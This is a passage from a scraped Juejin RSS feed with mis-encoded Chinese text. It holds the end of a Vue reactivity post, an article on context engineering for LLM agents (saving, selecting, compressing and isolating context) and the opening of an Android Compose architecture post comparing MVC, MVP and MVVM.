<p>ç†è§£Vueæ•°ç»„å“åº”å¼çš„å®ç°åŸç†ï¼Œä¸ä»…èƒ½å¸®åŠ©æˆ‘ä»¬é¿å…å¸¸è§çš„å‘ï¼Œè¿˜èƒ½å†™å‡ºæ›´é«˜æ•ˆã€æ›´å¯é çš„Vueåº”ç”¨ã€‚è®°ä½è¿™äº›èƒ½è§¦å‘å“åº”å¼æ›´æ–°çš„æ•°ç»„æ–¹æ³•ï¼Œè®©ä½ çš„Vueå¼€å‘æ›´åŠ å¾—å¿ƒåº”æ‰‹ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[åˆ«å·æ¨¡å‹äº†ï¼ä¸Šä¸‹æ–‡å·¥ç¨‹æ‰æ˜¯å¤§æ¨¡å‹åº”ç”¨çš„ç‹é“ï¼]]></title>    <link>https://juejin.cn/post/7582857981894131753</link>    <guid>https://juejin.cn/post/7582857981894131753</guid>    <pubDate>2025-12-13T07:10:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582857981894131753" data-draft-id="7582787460419502122" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="åˆ«å·æ¨¡å‹äº†ï¼ä¸Šä¸‹æ–‡å·¥ç¨‹æ‰æ˜¯å¤§æ¨¡å‹åº”ç”¨çš„ç‹é“ï¼"/> <meta itemprop="keywords" content="é¢è¯•,Java,åç«¯"/> <meta itemprop="datePublished" content="2025-12-13T07:10:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¨‹åºå‘˜é£é±¼"/> <meta itemprop="url" content="https://juejin.cn/user/1665088861772688"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            åˆ«å·æ¨¡å‹äº†ï¼ä¸Šä¸‹æ–‡å·¥ç¨‹æ‰æ˜¯å¤§æ¨¡å‹åº”ç”¨çš„ç‹é“ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1665088861772688/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¨‹åºå‘˜é£é±¼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-13T07:10:25.000Z" title="Sat Dec 13 2025 07:10:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{line-height:1.75;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;letter-spacing:2px;background-image:linear-gradient(90deg,rgba(50,0,0,.05) 3%,transparent 0),linear-gradient(1turn,rgba(50,0,0,.05) 3%,transparent 0);background-size:20px 20px;background-position:50%;word-break:break-word;font-weight:400;font-size:15px;overflow-x:hidden;color:#333}.markdown-body h1{font-size:23px;margin-bottom:5px;font-weight:700;padding-left:10px;border-left:5px solid #773098}.markdown-body h2{font-size:19px;font-weight:700;padding-left:10px;border-left:5px solid #916dd5}.markdown-body h3{font-size:17px;font-weight:700;padding-left:10px;border-left:5px solid #d89cf6}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{font-size:14px;margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{display:block;max-width:100%;margin:1em 0;border-radius:6px;box-shadow:2px 4px 7px #999;user-select:none}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{padding:.2em .5em;font-weight:700;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;font-size:1em;color:#916dd5;word-break:break-word;overflow-x:auto;background-color:none;border-radius:2px}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;font-weight:400;font-size:.9em;padding:16px 12px;margin:0;color:#333;word-break:normal;overflow-x:auto;background:#f8f8f8;scroll-behavior:smooth}.markdown-body a{text-decoration:none;color:#916dd5;font-weight:700;border-bottom:1px solid #916dd5}.markdown-body a:active,.markdown-body a:hover{color:#773098}.markdown-body table{display:inline-block!important;font-size:14px;width:auto;max-width:100%;overflow:auto;border:1px solid #916dd5;border-collapse:collapse}.markdown-body thead{background-color:#916dd5;color:#fff;text-align:left}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px;border:1px solid #916dd5}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #d89cf6;background-color:#f4eeff}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0;line-height:26px}.markdown-body ol,.markdown-body ul{padding-left:28px;list-style-type:circle}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body b,.markdown-body strong{color:#916dd5;font-weight:700}.markdown-body b:before,.markdown-body strong:before{content:"ã€Œ"}.markdown-body b:after,.markdown-body strong:after{content:"ã€"}.markdown-body em,.markdown-body i{color:#916dd5}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="github-gist">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#fff;color:#333}.hljs-comment,.hljs-meta{color:#969896}.hljs-emphasis,.hljs-quote,.hljs-strong,.hljs-template-variable,.hljs-variable{color:#df5000}.hljs-keyword,.hljs-selector-tag,.hljs-type{color:#d73a49}.hljs-attribute,.hljs-bullet,.hljs-literal,.hljs-symbol{color:#0086b3}.hljs-name,.hljs-section{color:#63a35c}.hljs-tag{color:#333}.hljs-attr,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-id,.hljs-selector-pseudo,.hljs-title{color:#6f42c1}.hljs-addition{color:#55a532;background-color:#eaffea}.hljs-deletion{color:#bd2c00;background-color:#ffecec}.hljs-link{text-decoration:underline}.hljs-number{color:#005cc5}.hljs-string{color:#032f62}</style><p>ç°åœ¨å·²ç»æ˜¯AIæ—¶ä»£äº†ï¼Œæˆ‘ä¹‹å‰å­¦è¿‡ä¸€äº›AIçš„ä¸œè¥¿ï¼Œæ‰€ä»¥åç»­å¼€å§‹åˆ†äº«ä¸€äº›AIç›¸å…³çš„å†…å®¹äº†ã€‚</p>
<blockquote>
<p>å¦‚AIå·¥å…·ï¼ŒAIç§‘æ™®ï¼ŒAIæœ€æ–°æŠ€æœ¯ç­‰ç­‰ï¼Œå¤§å®¶ä¸€èµ·æ‹¥æŠ±AIï¼Œå­¦ä¹ AIï¼Œåˆ©ç”¨AIã€‚</p>
</blockquote>
<p><strong>æ–‡ç« å†…å®¹æ”¶å½•åˆ°ä¸ªäººç½‘ç«™ï¼Œæ–¹ä¾¿é˜…è¯»</strong>ï¼š<a href="https://link.juejin.cn?target=http%3A%2F%2Fhardyfish.top%2F" target="_blank" title="http://hardyfish.top/" ref="nofollow noopener noreferrer">hardyfish.top/</a></p>
<p>å¯¹äºå¤§å¤šæ•°äººæ¥è¯´ï¼Œå¤„ç†å¤§é‡çš„æç¤ºè¯éå¸¸ä»¤äººå¤´ç–¼ï¼Œå‡ ä¹æ²¡äººæ„¿æ„èŠ±è´¹å¤§é‡çš„æ—¶é—´å»ç²¾å¿ƒè®¾è®¡è¿™äº›è¯ã€‚</p>
<blockquote>
<p>ç”¨æˆ·æ›´å€¾å‘äºç”¨ä¸€å¥è¯ã€ä¸€ä¸ªç®€å•æŒ‡ä»¤ï¼Œæ¥è¡¨è¾¾éœ€æ±‚ã€‚</p>
<p>æ‰€ä»¥ï¼Œä¸Šä¸‹æ–‡å·¥ç¨‹åšçš„äº‹æƒ…å°±æ˜¯åŸºäºç”¨æˆ·çš„<strong>ä¸Šä¸‹æ–‡</strong>æ¥è¡¥å……ä¿¡æ¯ã€‚</p>
</blockquote>
<p>ä½†è¿™é‡Œçš„ä¸Šä¸‹æ–‡ä¸å¤§æ¨¡å‹çš„ä¸Šä¸‹æ–‡ç»´åº¦æœ‰æ‰€ä¸åŒï¼š</p>
<blockquote>
<p>å¤§æ¨¡å‹çš„ä¸Šä¸‹æ–‡é€šå¸¸æ˜¯åŸºäºå•æ¬¡è¾“å…¥çš„ä¸Šä¸‹æ–‡ï¼Œè€Œ<strong>è¿™é‡Œæ‰€æŒ‡çš„ä¸Šä¸‹æ–‡åˆ™æ˜¯ç”¨æˆ·çš„å…¨éƒ¨å†å²æ•°æ®</strong>ã€‚</p>
<ul>
<li>ç”šè‡³å¯èƒ½è¿½æº¯åˆ°ç”¨æˆ·æœ€åˆä½¿ç”¨å¹³å°æ—¶çš„æ•°æ®ã€‚</li>
</ul>
<p>åœ¨ä¸Šä¸‹æ–‡çš„å¤„ç†ä¸Šï¼Œé€šå¸¸é‡‡ç”¨çš„æ–¹å¼å¤§ä½“ç›¸ä¼¼ï¼ŒåŒ…æ‹¬æ£€ç´¢å¬å›ã€çŸ¥è¯†åº“ã€å‘é‡åº“ã€çŸ¥è¯†å›¾è°±ç­‰ã€‚</p>
<ul>
<li>ä½†å…³é”®é—®é¢˜åœ¨äºå¦‚ä½•é«˜æ•ˆåœ°åˆ©ç”¨å’Œæ•´åˆè¿™äº›æ•°æ®ã€‚</li>
</ul>
</blockquote>
<p><strong>é‚£ç°åœ¨åŸºäºå¤§è¯­è¨€æ¨¡å‹çš„èŠå¤©åº”ç”¨ä¸­çš„ä¸Šä¸‹æ–‡æ˜¯æ€ä¹ˆå¤„ç†çš„?</strong></p>
<blockquote>
<p>å¤§æ¨¡å‹ä½œä¸ºçº¯ç²¹çš„æ¨ç†å¼•æ“ï¼Œä¸è®°ä½ä»»ä½•å†å²ä¿¡æ¯ã€‚</p>
<ul>
<li>åº”ç”¨å±‚è´Ÿè´£ç»´æŠ¤å®Œæ•´çš„å¯¹è¯å†å²ã€‚</li>
</ul>
<p>æ¯æ¬¡å‘æ¨¡å‹å‘èµ·è¯·æ±‚æ—¶ï¼Œéƒ½éœ€è¦æºå¸¦å®Œæ•´çš„ä¸Šä¸‹æ–‡ã€‚</p>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1fcc53a841dd4152b877da0c820cb37b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6aOe6bG8:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766214624&amp;x-signature=uCoSG5W78WirR0DkH0QmpSETzhQ%3D" alt="" loading="lazy"/></p>
<p>ä½†å½“åº”ç”¨åœºæ™¯æ˜¯ Agentic AI æ—¶ï¼Œä¸Šä¸‹æ–‡ç®¡ç†çš„å¤æ‚åº¦ä¼šå¾ˆé«˜ã€‚</p>
<blockquote>
<p>Agentic AI å…·å¤‡ä»»åŠ¡åˆ†è§£ã€å¤šæ­¥éª¤æ‰§è¡Œã€è‡ªä¸»æ€è€ƒå’Œå·¥å…·è°ƒç”¨ç­‰é«˜çº§èƒ½åŠ›ã€‚</p>
<p>è¿™äº›èƒ½åŠ›çš„å®ç°éƒ½ä¾èµ–äºæ›´åŠ ä¸°å¯Œå’Œå¤æ‚çš„ä¸Šä¸‹æ–‡ç»“æ„ã€‚</p>
</blockquote>
<p><strong>æ¯”å¦‚å•Agentåœºæ™¯</strong></p>
<blockquote>
<p>å‡è®¾ä¸€ä¸ªä»»åŠ¡è¢« Agent åˆ†è§£æˆäº† 10 ä¸ªå­ä»»åŠ¡ï¼Œæ¯ä¸ªå­ä»»åŠ¡éœ€è¦è°ƒç”¨ä¸¤æ¬¡å·¥å…·æ‰èƒ½å®Œæˆã€‚</p>
<p>é‚£ä¹ˆè¿™ä¸ªå¤§ä»»åŠ¡æ€»å…±ä¼šäº§ç”Ÿ 41 æ¡æ–°å¢çš„ä¸Šä¸‹æ–‡è®°å½•ï¼š</p>
<ul>
<li>1 æ¡åˆå§‹çš„ä»»åŠ¡åˆ†è§£æ€è€ƒï¼ŒåŠ ä¸Š 10 ä¸ªå­ä»»åŠ¡å„è‡ªäº§ç”Ÿçš„ 4 æ¡è®°å½•ï¼ˆ1 æ¬¡å·¥å…·è°ƒç”¨è¯·æ±‚ + 1 æ¬¡å·¥å…·è°ƒç”¨è¿”å›ï¼Œé‡å¤ä¸¤æ¬¡ï¼‰ã€‚</li>
</ul>
</blockquote>
<p>é‚£ç›®å‰ä¸šç•Œæ˜¯å¦‚ä½•åœ¨ Agent åº”ç”¨ä¸Šç®¡ç†ä¸Šä¸‹æ–‡çš„å‘¢ï¼Ÿ</p>
<blockquote>
<p>ä¸Šä¸‹æ–‡ä¼˜åŒ–å™¨ä¼šæ ¹æ®å½“å‰ç”¨æˆ·è¾“å…¥ã€ä»»åŠ¡ç›®æ ‡å’Œæ¨¡å‹çŠ¶æ€å†³å®šæ˜¯å¦è¿›è¡Œå‹ç¼©ã€‚</p>
<p>è¿˜æœ‰é‡‡ç”¨ä½•ç§å‹ç¼©ç­–ç•¥ã€ä¸¢å¼ƒå“ªäº›å†…å®¹ã€å­˜å‚¨ä¸ºè®°å¿†ï¼Œä»¥åŠä½•æ—¶è¿›è¡Œè®°å¿†å›å¡«ç­‰æ“ä½œã€‚</p>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b858d928c1384112b1b5ae6aa7329c00~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6aOe6bG8:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766214624&amp;x-signature=7bt4ZmYGww3iMP1%2BOLla8h3MFX4%3D" alt="" loading="lazy"/></p>
<p><strong>Context Engineeringçš„å…·ä½“å®ç°æ–¹æ³•ï¼ˆå‚è€ƒLangChainï¼‰</strong></p>
<p>ä¿å­˜Contextï¼š</p>
<blockquote>
<p>å°†Contextç­›é€‰æ€»ç»“åä¿å­˜åˆ°å†…å­˜ã€ç¡¬ç›˜ç­‰åœ°æ–¹ï¼Œåœ¨æ¨¡å‹éœ€è¦æ—¶å†å‘é€ç»™å®ƒã€‚</p>
<p>å¦‚ChatGPTçš„è®°å¿†åŠŸèƒ½ï¼Œå¯å°†ç”¨æˆ·è¾“å…¥çš„ä¿¡æ¯å­˜å…¥è®°å¿†åº“ã€‚</p>
</blockquote>
<p>é€‰æ‹©Contextï¼š</p>
<blockquote>
<p>é™æ€é€‰æ‹©ï¼šæŠŠæ°¸è¿œé‡è¦ã€å¿…é¡»éµå®ˆçš„ä¿¡æ¯åœ¨æ¯æ¬¡è¯·æ±‚æ—¶éƒ½æ”¾å…¥Contextã€‚</p>
<ul>
<li>å¦‚Cursorçš„Rulesæ–‡ä»¶ã€Claude Codeçš„Claude.mdæ–‡ä»¶ï¼Œç¡®ä¿AIè¡Œä¸ºç¬¦åˆé¢„æœŸã€‚</li>
</ul>
<p>åŠ¨æ€é€‰æ‹©ï¼šé€‰æ‹©ä¸ç”¨æˆ·é—®é¢˜æœ€ç›¸å…³çš„å†…å®¹æ”¾å…¥Contextã€‚</p>
<p>å¦‚ChatGPTä»è®°å¿†åº“ä¸­æŒ‘é€‰ç›¸å…³è®°å¿†ï¼Œä»ä¼—å¤šå·¥å…·ä¸­æŒ‘é€‰ç›¸å…³å·¥å…·ã€‚</p>
<ul>
<li>å…¶ä¸­æœ€æœ‰åçš„å®ç°æ–¹å¼æ˜¯Ragã€‚</li>
</ul>
</blockquote>
<p>å‹ç¼©Contextï¼š</p>
<blockquote>
<p>Agentè¿è¡Œæ—¶ï¼ŒContexté‡Œä¼šç§¯ç´¯å¤§é‡å†å²æ¶ˆæ¯ï¼Œæœ€å ç©ºé—´çš„æ˜¯æ¨¡å‹è¾“å‡ºã€æ–‡æœ¬å’Œå·¥å…·æ‰§è¡Œç»“æœã€‚</p>
<p>Claude Codeåœ¨ä½¿ç”¨é‡è¶…è¿‡95%æ—¶ï¼Œä¼šè¿è¡ŒAutocomPactç¨‹åºå¯¹Contextè¿›è¡Œå‹ç¼©ã€‚</p>
</blockquote>
<p>éš”ç¦»Contextï¼š</p>
<blockquote>
<p>ä¸åŒæ¨¡å—çš„Contextäº’ç›¸éš”ç¦»ã€‚</p>
<p>Lead Agentè´Ÿè´£ä»»åŠ¡ä¸‹å‘å’Œå½’çº³æ€»ç»“ï¼ŒSub Agentæœ‰ç‹¬ç«‹çš„å·¥å…·ã€è¿è¡Œå†å²å’Œè®°å¿†ä½“ç³»ï¼ŒContextäº’ä¸å½±å“ã€‚</p>
<p>Claude Codeä¸­ä¹Ÿæœ‰ç±»ä¼¼çš„SubAgentæ¦‚å¿µã€‚</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å…³äºAndroid Composeæ¶æ„çš„æ€è€ƒ]]></title>    <link>https://juejin.cn/post/7582857981894148137</link>    <guid>https://juejin.cn/post/7582857981894148137</guid>    <pubDate>2025-12-13T07:11:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582857981894148137" data-draft-id="7582787460419420202" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å…³äºAndroid Composeæ¶æ„çš„æ€è€ƒ"/> <meta itemprop="keywords" content="Android,å‰ç«¯,MVVM"/> <meta itemprop="datePublished" content="2025-12-13T07:11:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å°è™ç‰™007"/> <meta itemprop="url" content="https://juejin.cn/user/3940246036155640"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å…³äºAndroid Composeæ¶æ„çš„æ€è€ƒ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3940246036155640/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å°è™ç‰™007
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-13T07:11:36.000Z" title="Sat Dec 13 2025 07:11:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Compose æœ¬èº«æ˜¯<strong>å£°æ˜å¼ UI æ¡†æ¶</strong>ï¼Œå¤©ç„¶é€‚é…ã€Œå“åº”å¼æ¶æ„ã€ï¼Œä¼ ç»Ÿçš„ MVC/MVP å› ã€Œå‘½ä»¤å¼æ€ç»´ã€ï¼ˆæ‰‹åŠ¨æ›´æ–° UIï¼‰å·²ä¸å†é€‚é…ï¼Œä¸»æµæ¶æ„æ˜¯ <strong>MVVMï¼ˆæœ€è´´åˆï¼‰</strong>ï¼Œè¿›é˜¶åœºæ™¯ä¼šç»“åˆã€Œå•å‘æ•°æ®æµï¼ˆUDFï¼‰ã€ã€ŒClean Architectureï¼ˆæ•´æ´æ¶æ„ï¼‰ã€è®¾è®¡ï¼Œæ ¸å¿ƒç›®æ ‡æ˜¯è®©<strong>æ•°æ®çŠ¶æ€å•å‘æµè½¬</strong>ï¼Œé¿å… UI ä¸ä¸šåŠ¡é€»è¾‘è€¦åˆã€‚</p>
<h3 data-id="heading-0">ä¸€ã€å…ˆæ˜ç¡®ï¼šCompose ä¸ºä»€ä¹ˆâ€œæŠ›å¼ƒâ€MVC/MVPï¼Ÿ</h3>





















<table><thead><tr><th>æ¶æ„</th><th>æ ¸å¿ƒé—®é¢˜ï¼ˆé€‚é… Compose æ—¶ï¼‰</th></tr></thead><tbody><tr><td>MVC</td><td>Controller ç›´æ¥æ“ä½œ UIï¼ˆCompose ä¸­ UI ç”±çŠ¶æ€é©±åŠ¨ï¼Œæ— â€œ findViewById + æ›´æ–°â€çš„æ“ä½œå…¥å£ï¼‰ï¼Œæ˜“å¯¼è‡´çŠ¶æ€æ··ä¹±</td></tr><tr><td>MVP</td><td>Presenter æŒæœ‰ View æ¥å£ï¼Œé€šè¿‡æ¥å£å›è°ƒæ›´æ–° UIï¼ˆCompose ä¸­æ— â€œView æ¥å£â€ï¼Œå›è°ƒä¼šç ´åå£°æ˜å¼æ€æƒ³ï¼Œå¢åŠ æ¨¡æ¿ä»£ç ï¼‰</td></tr><tr><td>MVVM</td><td>ViewModel æŒæœ‰å¯è§‚å¯ŸçŠ¶æ€ï¼ŒUI ä»…è®¢é˜…çŠ¶æ€ï¼ˆå®Œå…¨è´´åˆ Compose â€œçŠ¶æ€é©±åŠ¨ UIâ€çš„æ ¸å¿ƒï¼Œæ— æ‰‹åŠ¨æ›´æ–°é€»è¾‘ï¼‰</td></tr></tbody></table>
